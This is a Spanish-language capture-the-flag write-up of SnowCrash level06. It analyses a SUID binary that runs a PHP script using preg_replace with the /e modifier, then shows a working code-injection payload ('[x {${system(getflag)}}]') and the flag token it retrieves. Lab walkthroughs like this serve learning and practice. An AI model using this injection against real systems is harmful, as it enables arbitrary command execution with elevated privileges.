1. **Busqueda de archivos**

    ```bash
    level06@SnowCrash:~$ ll
    [...]
    -rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06*
    [...]
    ```  
    Archivo con permisos SUID, usamos el comando `strings`para buscar algun texto legible
    ```bash
    level06@SnowCrash:~$ strings level06
    [...]
    /home/user/level06/level06.php
    [...]
    ```  
    El ejecutable `level06` parece ser un programa que utiliza `PHP` para ejecutar el archivo `/home/user/level06/level06.php`. Dado que tiene el bit `SUID` activado, cualquier acción que realice este programa se ejecutará con los privilegios del usuario `flag06`. Esto sugiere que el archivo PHP podría ser clave para explotar. El siguiente paso sería intentar leer el archivo level06.php para analizar su contenido y buscar vulnerabilidades.

2. **Vulnerabilidad**

    ```bash
    level06@SnowCrash:~$ cat /home/user/level06/level06.php
    #!/usr/bin/php
    <?php
    function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
    function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
    $r = x($argv[1], $argv[2]); print $r;
    ?>
    ``` 
    El archivo `level06.php` contiene un código PHP que parece vulnerable debido al uso de la función preg_replace con el modificador `/e`. Este modificador permite la ejecución de código PHP arbitrario dentro de una expresión regular, lo que puede ser explotado.
    Análisis del código:
    1. Función `y($m)`:
        - Reemplaza los puntos `(.)` por `" x "` y los caracteres `@` por `" y"`.
        - No parece peligrosa por sí sola.
    2. Función `x($y, $z)`:
        - Lee el contenido de un archivo especificado en `$y` usando `file_get_contents`.
        - Usa `preg_replace` con el modificador `/e` para ejecutar código PHP dentro de la expresión regular.
        - Reemplaza corchetes `[ y ]` por paréntesis `( y )`.
    3. Ejecución:
        - El script toma dos argumentos de línea de comandos `($argv[1] y $argv[2])`.
        - Llama a la función x con estos argumentos y muestra el resultado.

2. **Explotacion**

    Creamos un script malicioso que inyect código PHP
    ```bash
    echo '[x {${system(getflag)}}]' > /tmp/exploit
    ```
    Pasamos el archivo como argumento al script
    ```bash
    level06@SnowCrash:~$ ./level06 /tmp/exploit
    PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
    Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
    PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
    ````



